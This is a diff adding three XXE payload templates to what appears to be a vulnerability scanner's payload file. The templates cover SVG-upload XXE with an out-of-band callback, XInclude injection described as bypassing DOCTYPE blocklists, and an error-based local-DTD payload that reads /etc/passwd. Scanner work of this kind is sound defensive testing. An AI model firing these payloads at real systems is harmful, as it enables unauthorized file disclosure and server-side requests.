@@ -35,6 +35,18 @@ payloads:
     template: '<?xml version="1.0"?><!DOCTYPE r SYSTEM "http://{oast_host}/{canary}.dtd"><r/>'
     confidence: confirmed
     notes: External DOCTYPE blind-XXE; OAST callback confirms hit.
+  - id: svg_oast
+    template: "<?xml version=\"1.0\"?><!DOCTYPE svg [<!ENTITY x SYSTEM \"http://{oast_host}/{canary}\">]><svg xmlns=\"http://www.w3.org/2000/svg\"><text>&x;</text></svg>"
+    confidence: confirmed
+    notes: "SVG-upload XXE whose external entity is resolved during server-side thumbnail/render; the OAST callback confirms entity expansion from the image-processing path."
+  - id: xinclude_oast
+    template: "<r xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"http://{oast_host}/{canary}\" parse=\"text\"/></r>"
+    confidence: confirmed
+    notes: "XInclude injection that needs no DOCTYPE (bypasses DOCTYPE/ENTITY blocklists); the OAST callback confirms the parser fetched the included href."
+  - id: local_dtd_error
+    template: "<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY % local_dtd SYSTEM \"file:///usr/share/yelp/dtd/docbookx.dtd\"><!ENTITY % ISOamso '<!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\"><!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; err SYSTEM &#x27;file:///nonexist/%file;&#x27;>\">%eval;%err;'>%local_dtd;]><r/>"
+    confidence: likely
+    notes: "Error-based XXE that reuses an on-disk DTD and redefines one of its entities so target file content leaks inside the parse-error message; needs zero network egress and is confirmed by the file bytes in the returned error."
 mutations:
   - name: case_flip
     description: XML keywords are case-sensitive — flips produce known errors.
